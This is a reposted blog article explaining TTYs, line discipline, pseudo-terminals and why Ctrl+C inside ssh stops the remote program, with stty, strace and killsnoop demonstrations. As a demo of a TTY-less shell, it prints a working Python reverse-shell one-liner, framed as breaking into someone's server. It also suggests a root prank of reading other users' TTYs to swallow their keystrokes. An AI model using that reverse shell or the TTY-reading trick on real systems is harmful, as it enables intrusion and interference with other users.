<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://www.sobyte.net/post/2022-05/tty/">Original</a>
    <h1>What is TTY?</h1>
    
    <div id="readability-page-1" class="page"><div>
      <p>Let’s start with an interview question: We know that there are some common shortcuts in the terminal, <code>Ctrl+E</code> to move to the end of a line, <code>Ctrl+W</code> to delete a word, <code>Ctrl+B</code> to move a letter forward, and pressing the up key to bring up the last shell command used. Among these 4 shortcuts, there is one that is implemented differently from the others, which one is it?</p>
<p>The answer is <code>Ctrl+W</code>. Because <code>Ctrl+W</code> is provided by something called TTY, and the other three are provided by the shell. Okay, I admit that I might get beaten up for asking someone such a question, but here it is just to catch the reader’s interest.</p>
<p>Let’s look at another interesting question: If you are on <code>host1</code> and logged into <code>host2</code> using the <code>ssh</code> command, and then executed the <code>sleep 9999</code> command. What happens when you press <code>Ctrl+C</code> at this time?</p>
<ol>
<li><code>ssh</code> on <code>host1</code> will be stopped</li>
<li>the <code>sleep</code> command on <code>host2</code> will be stopped and the <code>ssh</code> session will remain</li>
</ol>
<p>Anyone who has used the <code>ssh</code> command should know that the phenomenon is (2) that we can just <code>Ctrl+C</code> inside the shell provided by ssh without any effect on ssh.</p>
<p>So how does this work?</p>
<p>We know that <code>Ctrl+C</code> sends a signal with an int value of 2, called SIGINT. So we can guess: is it possible that the ssh process received the SIGINT and forwarded it to the ssh remote program, but won’t handle the signal itself?</p>
<p>We can verify this conjecture using the <a href="https://github.com/brendangregg/perf-tools/blob/master/killsnoop">killsnoop</a> program, which prints out the signals between processes.</p>
<p>First we start the killsnoop program.</p>
<div><div>
<table><tbody><tr><td>
<pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td>
<td>
<pre tabindex="0"><code data-lang="sh"><span><span>root@vagrant:/home/vagrant# ./perf-tools/killsnoop
</span></span><span><span>Tracing kill<span>()</span>s. Ctrl-C to end.
</span></span><span><span>COMM             PID    TPID     SIGNAL     RETURN
</span></span></code></pre></td></tr></tbody></table>
</div>
</div><p>Then open a new shell, press <code>Ctrl+C</code> and you will see that the shell (pid=1549) received signal=2, i.e. SIGINT.</p>
<div><div>
<table><tbody><tr><td>
<pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span><span>8
</span><span>9
</span></code></pre></td>
<td>
<pre tabindex="0"><code data-lang="sh"><span><span>vagrant@vagrant:~$ ps
</span></span><span><span>    PID TTY          TIME CMD
</span></span><span><span>   <span>1549</span> pts/1    00:00:00 bash
</span></span><span><span>   <span>1644</span> pts/1    00:00:00 ps
</span></span><span><span>vagrant@vagrant:~$ ^C
</span></span><span><span>root@vagrant:/home/vagrant# ./perf-tools/killsnoop
</span></span><span><span>Tracing kill<span>()</span>s. Ctrl-C to end.
</span></span><span><span>COMM             PID    TPID     SIGNAL     RETURN
</span></span><span><span>bash             <span>1549</span>   <span>1549</span>     <span>2</span>          <span>0</span>
</span></span></code></pre></td></tr></tbody></table>
</div>
</div><div><div>
<table><tbody><tr><td>
<pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span></code></pre></td>
<td>
<pre tabindex="0"><code data-lang="sh"><span><span>root@vagrant:/home/vagrant# ./perf-tools/killsnoop
</span></span><span><span>Tracing kill<span>()</span>s. Ctrl-C to end.
</span></span><span><span>COMM             PID    TPID     SIGNAL     RETURN
</span></span><span><span>bash             <span>1549</span>   <span>1549</span>     <span>2</span>          <span>0</span>
</span></span></code></pre></td></tr></tbody></table>
</div>
</div><p>Then we ssh to the local machine and press <code>Ctrl+C</code> inside ssh :</p>
<div><div>
<table><tbody><tr><td>
<pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span></code></pre></td>
<td>
<pre tabindex="0"><code data-lang="sh"><span><span>vagrant@vagrant:~$ ssh vagrant@127.0.0.1
</span></span><span><span>vagrant@127.0.0.1<span>&#39;</span>s password:
</span></span><span><span>Welcome to Ubuntu 20.04.2 LTS <span>(</span>GNU/Linux 5.4.0-77-generic x86_64<span>)</span>
</span></span><span><span> 
</span></span><span><span>vagrant@vagrant:~$ ^C
</span></span></code></pre></td></tr></tbody></table>
</div>
</div><p>If our guess is correct, the shell (pid=1549) should still be receiving SIGINT and forwarding it to the ssh process.</p>
<p>But killsnoop shows that only the shell that ssh opened received SIGINT, the ssh process itself and the original shell with pid=1549 did not receive any.</p>
<div><div>
<table><tbody><tr><td>
<pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td>
<td>
<pre tabindex="0"><code data-lang="sh"><span><span>systemd-udevd    <span>392</span>    <span>1653</span>     <span>15</span>         <span>0</span>
</span></span><span><span>systemd-udevd    <span>392</span>    <span>1664</span>     <span>15</span>         <span>0</span>
</span></span><span><span>bash             <span>1689</span>   <span>1689</span>     <span>2</span>          <span>0</span>
</span></span></code></pre></td></tr></tbody></table>
</div>
</div><p>Obviously, our conjecture is not valid. So how is it possible that <code>Ctrl+C</code> does not affect ssh itself but affects the programs inside ssh? I believe that you will have an answer after reading this article.</p>
<p>Hopefully, it has attracted enough interest to start with TTY, so let’s start the archaeology now.</p>
<h2 id="tty-is-a-product-of-history">TTY is a product of history</h2>
<p>The first thing to be clear is that TTY is a historical artifact. Just like Unix systems now have so many <code>/bin</code> directories. It’s because many programs exist by default, older programs need them to run, and newer programs will be compatible with them by default. If you write a completely redesigned Terminal or directory organization without regard to historical reasons and compatibility, you don’t need so many <code>/bin</code>s and you don’t need TTYs.</p>
<p>Here’s a brief history of the time when TTY was needed and why it was indispensable in that case, along with the various subcomponents.</p>
<p>The full name of TTY is Teletype, what is Teletype?</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/05/09/30f573f976ee44ac9c1817dc7681e90e.png" alt="Teletype"/></p>
<p>This, then, is Teletype.</p>
<p><a href="https://www.youtube.com/watch?v=S81GyMKH7zw">This video</a> shows how it works.</p>
<p>There is also a Twitter account called <a href="https://twitter.com/33asr">Teletype Model 33</a> that posts related content, such as this <code>git push</code> video on <a href="https://twitter.com/33asr/status/1097165302125789184">Teletype</a>.</p>
<p>Simply put, a long time ago, many people used one computer together (you’ve heard of Unix as a multi-user, multi-tasking operating system, right?) . Everyone had a “terminal” (Terminal, TTY, in this context). Here you type down the command you want to run, send it to the system for execution, get the result from the system, and print the result on paper.</p>
<p>So, at the time, TTY was a piece of hardware, and as a piece of hardware, how was it connected to the computer?</p>
<p>First there is a wire, but this wire is not actually connected directly to the computer, but to a piece of hardware called a Universal Asynchronous Receiver and Transmitter (UART). the UART Driver can read information from the hardware and send it to the TTY Driver. the TTY reads from it TTY reads it from it and sends it to the program. (In fact, UARTs are still in use today, so if you’ve played with Arduino or Raspberry Pi, you may have come across them.)</p>
<p>Something like this.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/05/09/dbdc5895ff674dc79f89d970a828034a.png" alt="TTY"/></p>
<p>Up to this point, it’s actually relatively straightforward for us “modern people”. The input from the hardware is copied through the Driver layer by layer to the application.</p>
<p>Wait, there is something called “Line discipline” on top. What the hell is that?</p>
<p>As its name says, it is used to “discipline” the line. The command is actually stored in the TTY after it is typed and before the <code>Enter</code> key is pressed. A line that exists in TTY can be “disciplined” by Line discipline. For example, it provides the function to delete by <code>Ctrl+U</code>, that is, after you press <code>Ctrl+U</code>, TTY will not send characters to the following program, but will delete the whole line in the current cache. Similarly, <code>Ctrl+W</code> deletes a character, a feature provided by Line discipline. (Wow! Now you pass my interview!) I’ll prove later that this is a TTY feature.</p>
<p>This function is simply too boring for us “modern” people. Can’t we just leave it to bash? Is it necessary to handle such things as a subsystem of the Kernel?</p>
<blockquote>
<p>Whenever you want to criticize someone, remember that not all people in this world have the same advantages you have.</p>
</blockquote>
<p>Yes, back in the days of Unix, there was no such condition.</p>
<p>A long time ago, it was too tiring for computers to read in every character and send it immediately to the program that followed. If 20 people were typing at 60 words per minute, it would take about 100 context switches and disk swaps per second, so the computer would spend 100% of its time processing these people’s keystrokes and would have no time to do anything else. (PS This is actually what I can see from <a href="https://dev.to/dwgillies/comment/p49i">dev.to a comment</a>, it’s really wonderful, I read a lot of articles before I saw this comment but I didn’t understand why I needed Line discipline.)</p>
<p>The biggest use of Line discipline is actually a programmable middleman. It can buffer the contents of 20 TTYs until one person presses Enter, then it actually sends the contents to the back-end program. A Line discipline module can cache 20 TTYs, so if we need 30s to enter a command, that’s about 1.5s per user. That’s almost 100 times faster.</p>
<p>Line discipline works a bit like Emacs, with a function table of size=127, and each key has a bound function. For example: enter buffer; send command out, etc.</p>
<p>You can set TTY to raw mode, so that Line discipline will not interpret the characters it receives, but will send them directly to the program behind it (the foreground process group, session, to be exact) (in fact, this is the reason why ssh does not receive SIGINT, but the program inside ssh does. (I’ll show you later). Nowadays, many programs use raw mode for TTY, such as ssh and Vim. But a long time ago, Vim ran in cooked mode (i.e., Line discipline worked). When you typed some text in the middle of a line, like <code>asdffwefs</code>, the screen would go haywire and the text would overwrite what came after it until you pressed <code>Esc</code> to exit editing.</p>
<p>Today’s computers have become a million times more powerful than the hardware of that time, so Line discipline has little meaning. But at that time, if one wanted to delete and edit the currently typed command, where was the most appropriate place to implement this function? Obviously the buffer!</p>
<p>The performance issues here are history, but TTY and Line discipline are here to stay because (I’m guessing) many programs are written with TTY by default, such as bash, and TTY continues to retain Line discipline without the user feeling anything about it.</p>
<p>So what exactly is a TTY today? Essentially, it is no longer a piece of hardware, but just a piece of software (kernel subsystem). At the user level of the system, it is - a file. Of course, what is not a file in Unix?</p>
<p>The <code>tty</code> command allows you to see which TTY is used by the current shell.</p>
<p>As a “file”, you can write directly to it. The content written to the TTY will be read out by the output device. (The diagram below shows the shell writing below and appearing in the shell above)</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/05/09/ab05c272b8e84848a0a4dc4943ab86bf.png" alt="tty"/></p>
<p>Of course, it’s possible to read. But when you read from the TTY, you are in competition with the output device, because you are both trying to read from this TTY, which had only one reader, and now has two. I pressed the numbers 1-9 in the shell above, and each time I entered a number I wasn’t sure which side it would be read from.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/05/09/682ca311e5d548dbbf198d9c3fef4802.png" alt="tty"/></p>
<p>Once it is read by <code>cat</code>, the key you pressed will not be displayed in the current shell.</p>
<p>Got a bad, bad idea? Yes, we can use the <code>w</code> command to see who is logged in to the machine, then go to <code>cat</code> their TTY and they will surely think their keyboard is broken! (Tip, when a user logs in, the TTY file permissions used will be set to read and write only to themselves, and the owner set to himself, so you have to be root for this prank to work!)</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/05/09/4c889fb7a4da4adba919212375f0cc8b.png" alt="tty"/></p>
<p>Having understood what TTY is, what is it good for today?</p>
<p>We can think about this question in reverse: Can we do without TTY?</p>
<p>The answer is yes.</p>
<p>I can demonstrate that you can use the terminal without TTY.</p>
<p>Imagine a scenario where you break into someone’s machine, such as the server where kawabangga.com is located, and you find a way to execute python code inside it, but you can only inject the code into it and execute it without seeing the output, what do you do?</p>
<p>There is something called reverse shell. In layman’s terms, our ssh is usually a shell that we run to a remote computer to control, and reverse, as the name implies, is a shell that I open on a remote machine and then give it to you to control.</p>
<p>For the following demonstration, I opened a tcp port in the following terminal using nc, and then executed the following command in the terminal above.</p>
<div><div>
<table><tbody><tr><td>
<pre tabindex="0"><code><span>1
</span></code></pre></td>
<td>
<pre tabindex="0"><code data-lang="sh"><span><span>python3 -c <span>&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;127.0.0.1&#34;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
</span></span></code></pre></td></tr></tbody></table>
</div>
</div><p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/05/09/7e064a9b21114361ac48c44faf843869.png" alt="python"/></p>
<p>You can see that this python code actually opens a <code>sh</code> program and then connects stdin/stdout/stderr all to the tcp socket. For the nc end, the stdin/stdout/stderr of the nc sends into the socket, so my nc becomes a shell that can control the other side!</p>
<p>This way, I can execute commands on the other side’s host at will, very convenient!</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/05/09/ff906a00ee244efc8cef7897e6681bd9.png" alt="shell"/></p>
<p>It is possible to <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">open reverse shell</a> using other languages.</p>
<p>As you can see from the image above, this is a shell without TTY. what’s wrong with it? Let’s run a TUI program, like <code>htop</code>.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/05/09/a527d351ef0048e5a96794ee85149d8e.png" alt="htop"/></p>
<p>Note the problem in the top left corner, it is actually trying to hit <code>hostname</code> after pressing <code>q</code>, and sh has lost its mind and can’t even display the characters I hit properly. In addition, this shell without TTY has the following disadvantages:</p>
<ol>
<li>it can’t use TUI programs like Vim, htop, etc.</li>
<li>can’t use tab completion</li>
<li>you can’t use the up arrow to see the history command</li>
<li>no job control</li>
<li>……</li>
</ol>
<p>(Actually, <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">reverse shell can also have TTY</a>)</p>
<p>So, today, we can run an incomplete shell without TTY, after all, our hardware today has nothing to do with teletyping.</p>
<p>However, TTY still serves an important function as a kernel module. Terminal can tell TTY to move the pointer, clear the screen, reset the size, and so on.</p>
<p>Eh? Wait a minute, why do the <code>tty</code> commands we see in the image above start with <code>/dev/pts/</code> and not <code>/dev/tty</code>? What’s the difference?</p>
<p>This is actually a “pretend” TTY, called Pseudo terminal.</p>
<p>I don’t know if you realize that one of the important points about TTY we discussed above is that TTY is a module (subsystem, drive) of the kernel, and TTY is in kernel space, not user space, so how can our modern Terminal programs, ssh programs, etc., interact with TTY?</p>
<p>The answer is PTY.</p>
<p>The explanation will be simplified here to make it easier to understand. When a program like iTerm2 needs a TTY, it asks the Kernel to create a PTY pair for it. Note that it is a pair, which means that PTYs always come in pairs. The slave is given to the program (as mentioned earlier, programs like bash assume the existence of a TTY by default and work with it in an interactive state), and the program does not know whether it is a PTY slave or a real TTY, it just reads and writes. The PTY master is returned to the program that asked for it (usually ssh, terminal emulator graphics software, tmux, etc.), which gets it (actually an fd) and can read and write the master PTY. The kernel is responsible for copying the contents of the master PTY to the slave PTY, and the contents of the slave PTY to the master PTY. pts means pseudo-terminal slave, which means that the login device of these interactive shells device is the pseudo-terminal slave.</p>
<div><div>
<table><tbody><tr><td>
<pre tabindex="0"><code><span>1
</span></code></pre></td>
<td>
<pre tabindex="0"><code data-lang="txt"><span><span>terminal emulator - pty master &lt;-- TTY driver( copies stuff from/to) --&gt; pty slave - shell
</span></span></code></pre></td></tr></tbody></table>
</div>
</div><p>So, the programs we see under the GUI, like Xterm/iTerm2 (which actually uses <a href="https://man7.org/linux/man-pages/man4/ttys.4.html">ttyS</a>, so I won’t go into details here), like the shell opened in tmux, like the ssh opened shell, all of them are PTY. So, these terminals under the GUI, similar to konsole, Xterm, are called “terminal emulators”, they are not real terminals, they are emulated.</p>
<p>How do I get to a real TTY? Simple, in Ubuntu desktop system, <code>Ctrl+Alt+F1</code> pressed, is a graphical interface, but <code>Ctrl+Alt+F2</code> (actually F2-F6 are), is a terminal, this terminal, is TTY, you log in there and press <code>tty</code> command, it will tell you this is tty device up.</p>
<p>I happen to have a virtualbox virtual machine, only command line, no GUI, log in, then you can see that this is a TTY.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/05/09/ca14dbb4c6e047ed97c9b8e5109186b3.png" alt="tty"/></p>
<p>Finally, let’s go back to the second question at the beginning of this article: Why does pressing <code>Ctrl+C</code> in ssh not stop ssh, but stops the programs inside ssh?</p>
<p>Let’s review what happened when we pressed <code>Ctrl+C</code> locally.</p>
<ol>
<li>the kernel driver receives the <code>Ctrl+C</code> input, ignoring any unrelated modules in between.</li>
<li>then it reaches TTY, TTY receives this input and sends a SIGINT signal to the current process group in the foreground of TTY (in fact, it sends it to whichever session TTY is currently assigned to). if bash is currently in the foreground, bash will receive this signal, and if it is <code>sleep</code>, then <code>sleep</code> will receive it.</li>
</ol>
<p>Since <code>SIGTERM</code> is a signal that can be handled by the program itself, bash decides to ignore it after receiving it, and sleep exits after receiving it.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/05/09/93665ff84d264f1fb1493246ecabcb17.png" alt="ssh"/></p>
<p>The <code>stty</code> program allows us to modify tty’s function table, <code>Ctrl+C</code> Here it is about a function called <code>isig</code>.</p>
<blockquote>
<p>[-] isig</p>
<p>enable interrupt, quit, and suspend special characters</p>
<p>-from <code>man isig</code></p>
</blockquote>
<p>This actually means that if TTY receives an input like <code>Ctrl+C</code> (the original symbol is <code>^C</code>, correspondingly, you can use the <code>stty -a</code> command to check, the default quit is <code>^\</code> and the default suspend is <code>^Z</code>), instead of sending it to the program behind it, convert it to SIGINT and send it to the process group behind the current TTY . So we can use <code>stty -isig</code> to turn off this behavior.</p>
<p>Now, if you press <code>Ctrl+C</code> in the <code>sleep</code> program, TTY will send the <code>^C</code> character to the <code>sleep</code> program as is, and <code>sleep</code> will not receive any signal. We can’t use <code>Ctrl+C</code> to end the sleep program.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/05/09/e0419024505140fea7bfc5929ffbb70c.png" alt="Ctrl+C"/></p>
<p>Back to the ssh problem, our reasonable guess is that ssh will first disable <code>isig</code> for the shell it is currently in when it gets the remote shell, so that <code>Ctrl+C</code> will be sent to ssh as a character, the ssh client will send this character to the remote ssh server, ssh server sends it to its own TTY (which is actually a PTY master), and finally the remote TTY sends a SIGINT signal to the current remote foreground process.</p>
<p>How can we verify our suspicions?</p>
<p>Verification 1</p>
<p>We can use <code>stty</code> to check the TTY settings of the shell, and then use this shell to log in via ssh and check the TTY settings again.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/05/09/38a50407953d4e05b899e791331a05b7.png" alt="stty"/></p>
<p>In this diagram, we use the shell above to view the shell TTY configuration below. You can see that the first view is before the ssh login and <code>isig</code> is on. The second view is after the ssh login, <code>isig</code> becomes off. If ssh logs out, <code>isig</code> becomes on again.</p>
<p>Verification 2</p>
<p>To prove the opposite, if we force the TTY where ssh is located to turn <code>isig</code> on before the ssh login, then pressing <code>Ctrl-C</code> will end the ssh process itself, not the program running inside ssh.</p>
<p>Since I’m using ssh to log in locally, I’ve changed the command line prompt of the local shell to distinguish between the current local shell and ssh.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/05/09/bd14e3f1d9bc48b2b7eb277f3baa700e.png" alt="ssh"/></p>
<p>This image is from ssh after logging in and running <code>stty --file /dev/pts/0 isig</code> in another shell to open <code>isig</code> on the shell where ssh is located. Then press <code>Ctrl+C</code> in ssh (the current foreground program is <code>sleep 9999</code>). At this point ssh exits directly, and we are back in the local shell, rather than ending sleep in ssh.</p>
<p>Verification 3</p>
<p>We can use the <code>strace</code> program directly to trace the ssh system calls.</p>
<div><div>
<table><tbody><tr><td>
<pre tabindex="0"><code><span>1
</span></code></pre></td>
<td>
<pre tabindex="0"><code data-lang="sh"><span><span>strace -o strace.log ssh vagrant@127.0.0.1
</span></span></code></pre></td></tr></tbody></table>
</div>
</div><p>You can see that when ssh starts, there is a line that says</p>
<div><div>
<table><tbody><tr><td>
<pre tabindex="0"><code><span>1
</span></code></pre></td>
<td>
<pre tabindex="0"><code data-lang="txt"><span><span>ioctl(0, SNDCTL_TMR_STOP or TCSETSW, {B9600 -opost -isig -icanon -echo ...}) = 0
</span></span></code></pre></td></tr></tbody></table>
</div>
</div><p>is changing the TTY setting to <code>-isig</code>, and some other settings.</p>
<p>Then, when ssh exits, there is a line that says</p>
<div><div>
<table><tbody><tr><td>
<pre tabindex="0"><code><span>1
</span></code></pre></td>
<td>
<pre tabindex="0"><code data-lang="txt"><span><span>ioctl(0, SNDCTL_TMR_STOP or TCSETSW, {B9600 opost isig icanon echo ...}) = 0
</span></span></code></pre></td></tr></tbody></table>
</div>
</div><p>Change the settings back.</p>
<p>In fact, if you use Terminal enough, you must have encountered this situation: after running some TUI program, it exits abnormally (for example, it gets stuck, crashes, or gets <code>SIGKILL</code>), and then you go to Terminal and find that Terminal is all messed up, carriage return does not work, <code>Ctrl+W</code> does not work, and so on. This is probably because the program did not execute the reset tty code that should have been executed at the time of exit. Use the <code>reset</code> command to reset the current Terminal and bring it back to its senses.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/05/09/be12bcef0c5e493e9b3f04196e2979fd.png" alt="reset"/></p>
<p>So back to the first question, how do you prove which shortcuts are provided by TTY and which are provided by the shell?</p>
<p>This is even easier, in fact <code>stty -a</code> already prints out all the stty configurations</p>
<div><div>
<table><tbody><tr><td>
<pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span><span>8
</span></code></pre></td>
<td>
<pre tabindex="0"><code data-lang="sh"><span><span>stty -a
</span></span><span><span>speed <span>9600</span> baud<span>;</span> rows 52<span>;</span> columns 187<span>;</span> <span>line</span> <span>=</span> 0<span>;</span>
</span></span><span><span><span>intr</span> <span>=</span> ^C<span>;</span> <span>quit</span> <span>=</span> ^<span>\;</span> <span>erase</span> <span>=</span> ^?<span>;</span> <span>kill</span> <span>=</span> ^U<span>;</span> <span>eof</span> <span>=</span> ^D<span>;</span> <span>eol</span> <span>=</span> M-^?<span>;</span> <span>eol2</span> <span>=</span> M-^?<span>;</span> <span>swtch</span> <span>=</span> &lt;undef&gt;<span>;</span> <span>start</span> <span>=</span> ^Q<span>;</span> <span>stop</span> <span>=</span> ^S<span>;</span> <span>susp</span> <span>=</span> ^Z<span>;</span> <span>rprnt</span> <span>=</span> ^R<span>;</span> <span>werase</span> <span>=</span> ^W<span>;</span> <span>lnext</span> <span>=</span> ^V<span>;</span> <span>discard</span> <span>=</span> ^O<span>;</span>
</span></span><span><span><span>min</span> <span>=</span> 1<span>;</span> <span>time</span> <span>=</span> 0<span>;</span>
</span></span><span><span>-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
</span></span><span><span>-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc ixany imaxbel iutf8
</span></span><span><span>opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
</span></span><span><span>isig icanon iexten <span>echo</span> echoe -echok -echonl -noflsh -xcase -tostop -ech
</span></span></code></pre></td></tr></tbody></table>
</div>
</div><p>In <code>raw</code> mode, even the Enter key is newline, and will not give you the ability to move the cursor to the beginning of the line.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/05/09/016d72c2748140b4b47affeb6d674054.png" alt="raw mode"/></p>
<p>If you cancel <code>Ctril+W</code>, this function is naturally gone. Typing a <code>Ctrl+W</code> is really a <code>^W</code>.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/05/09/6c357b196c4d4bcf897abf9d41d859ea.png" alt="Ctril+W"/></p>
<p>What about those shell shortcuts (like <code>Ctrl+E</code>)? We can use the <code>sh</code> program to verify that they are functions provided by the shell, not by TTY. <code>sh</code> is a very silly program and does not explain the <code>Ctrl+A</code> or up keys. Pressing the left arrow brings up <code>^[[D</code> and pressing <code>Ctrl+A</code> brings up <code>^A</code> (it feels like many people have seen these characters before, and when the shell is stuck, pressing the arrow will put these raw characters on the screen). However, under normal TTY (cooked TTY, you can use reset command to restore the TTY we played with before), <code>Ctrl+W</code> function is still available under <code>sh</code>.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/05/09/abeaee8195aa4b16a269930ec6c0d436.png" alt="ssh"/></p>

    </div></div>
  </body>
</html>
